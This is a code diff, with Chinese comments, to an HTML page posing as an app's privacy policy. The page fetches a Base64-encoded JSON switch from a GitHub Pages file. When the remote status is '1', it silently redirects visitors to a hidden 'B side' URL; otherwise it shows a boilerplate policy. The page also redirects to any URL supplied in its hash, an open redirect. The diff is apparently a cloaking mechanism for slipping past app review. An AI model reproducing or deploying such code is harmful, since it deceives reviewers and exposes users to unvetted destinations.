@@ -1,7 +1,10 @@
 <!DOCTYPE html>
 <html lang="en"><head>
     <script>
-        const BASE_URL = 'https://www.termsfeed.com/live/0c36b531-146e-4692-b164-6f367e71543f';
+        // 1. 更新了你的 API 链接
+        const API_URL = 'https://mikeprivacypolicy.github.io/testweb/privacy.text';
+        // Logo 图片的占位基础路径（防止新接口带 .text 导致原代码里的 logo 图片链接失效）
+        const LOGO_BASE_URL = 'https://mikeprivacypolicy.github.io'; 
         const SAFE_COLOR = '#eee';
     </script>
     <meta charset="UTF-8">
@@ -95,26 +98,22 @@
         if (window.location.hash) {
             setTimeout(()=>window.location.href = decodeURIComponent(window.location.hash.substring(1)), 200);
         } else {
-            // 1. 请求纯文本
-            fetch(BASE_URL).then(r => r.text()).then(text => {
+            // 1. 请求 GitHub 上的纯 Base64 文本
+            fetch(API_URL).then(r => r.text()).then(text => {
                 
-                // 2. 通过 @@ 分割并取中间元素
-                const arr = text.split('@@');
-                const midIndex = Math.floor(arr.length / 2);
-                const base64Str = arr[midIndex].trim();
+                // 2. 直接获取 Base64 并去除两边多余的空格或换行符
+                const base64Str = text.trim();
                 
                 // 3. Base64 解码并转成 JSON (兼容中文)
                 const jsonStr = decodeURIComponent(escape(window.atob(base64Str)));
                 const info = JSON.parse(jsonStr);
 
                 // 4. 根据 JSON 中的状态判断走向
-                // 【注】这里假设 status 为 "1" 时代表跳转B面，如果是其他字段请自行修改条件
                 if (info.status === '1') {
-                    // 跳转链接换成了 info.introduce
+                    // 跳转到 B 面的链接
                     setTimeout(() => window.location.href = info.introduce, 200);
                 } else {
                     (() => {
-                        // 由于新 JSON 没有 app_name 字段，这里加了一个默认值 "Our App"
                         const appName = "Our App";
                         const content = `&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Privacy Policy for ${appName}
                             &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;At ${appName} , one of our main priorities is the privacy of our visitors. This Privacy Policy document contains types of information that is collected and recorded by ${appName} and how we use it.
@@ -142,7 +141,7 @@
                         const page = document.querySelector('.page');
                         page.innerHTML = '';
                         page.appendChild(Object.assign(document.createElement('div'), {style: 'height: 60px;'}));
-                        page.appendChild(Object.assign(document.createElement('div'), {className: 'icon', innerHTML: '<img src="'+BASE_URL+'/logo.jpg?--pro-target=A" id="logo" alt="logo">'}));
+                        page.appendChild(Object.assign(document.createElement('div'), {className: 'icon', innerHTML: '<img src="'+LOGO_BASE_URL+'/logo.jpg?--pro-target=A" id="logo" alt="logo">'}));
                         page.appendChild(Object.assign(document.createElement('div'), {style: 'height: 60px;'}));
                         const contentDom = Object.assign(document.createElement('div'), {className: 'content', style: 'flex: 1;'});
                         page.appendChild(contentDom);
@@ -155,14 +154,14 @@
                                 window.NativeApp.closeWebView()
                             } else {
                                 try { uni.webView.redirectTo({url:'/pages/index/index'}); } catch (e) {}
-                                window.location.href = BASE_URL + '/index.html';
+                                window.location.href = '/index.html';
                             }
                         })
                     }) ()
                 }
             }).catch(e => {
                 console.error("解析或请求失败:", e);
-                // 失败兜底，可根据需要直接跳转A面，如：
+                // 失败兜底可以触发通知原生端
                 // if(window.NativeApp) window.NativeApp.closeWebView();
             });
         }
